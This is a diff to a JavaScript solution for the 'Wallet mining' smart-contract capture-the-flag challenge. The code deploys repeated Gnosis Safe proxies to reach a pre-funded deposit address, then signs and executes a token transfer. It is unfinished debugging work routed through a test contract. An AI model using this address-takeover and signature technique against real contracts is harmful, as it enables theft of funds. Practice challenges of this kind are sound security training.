@@ -118,6 +118,17 @@ describe('[Challenge] Wallet mining', function () {
         const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
                         "function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",
                         "function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];
+        const setupDummyABIData = createInterface(safeABI, "setup",  [
+            [player.address],
+            1,
+            ethers.constants.AddressZero,
+            0,
+            ethers.constants.AddressZero,
+            ethers.constants.AddressZero,
+            0,
+            ethers.constants.AddressZero,
+        ])
+
         const setupABIData = createInterface(safeABI, "setup",  [
             [player.address],
             1,
@@ -143,7 +154,7 @@ describe('[Challenge] Wallet mining', function () {
         console.log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);
 
         for (let i = 0; i < nonceRequired ; i ++) {
-            await proxyFactory.createProxy(safeContractAddr, setupABIData);
+            await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);
         }
 
         const tokenABI = ["function transfer(address to, uint256 amount)"];
@@ -154,7 +165,14 @@ describe('[Challenge] Wallet mining', function () {
         // 3. send it below
 
         const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);
-        console.log(await depositAddrSafe.VERSION());
+        
+        const testFactory = await ethers.getContractFactory("TestSafe", player);
+        const testContr = await testFactory.deploy();
+
+        console.log(await testContr.VERSION());
+        // return;
+
+        // console.log(await depositAddrSafe.VERSION());
         
         const transactionParams = [
             token.address,
@@ -169,13 +187,23 @@ describe('[Challenge] Wallet mining', function () {
             0
         ];
 
-        const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
-        console.log(txhash);
+        // const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
+        const txhash = await testContr.getTransactionHash(...transactionParams);
+        console.log("Tx hash from contract:", txhash);
 
-        const signed = await player.signMessage(txhash);
-        console.log(signed);
+        const txHashBytes = ethers.utils.arrayify(ethers.utils.hashMessage(txhash));
 
-        await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signed);
+        const signed = await player.signMessage(txHashBytes);
+        console.log("Signed tx hash:", signed);
+
+        // const recovered = ethers.utils.verifyMessage(txHashBytes, signed);
+
+        // console.log(recovered)
+        // console.log(player.address)
+        // return;
+
+        // await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signed);
+        await testContr.execTransaction(...(transactionParams.slice(0, -1)), signed);
         return;
 
         const execTransactionData = createInterface(safeABI, "getTransactionHash", transactionParams)
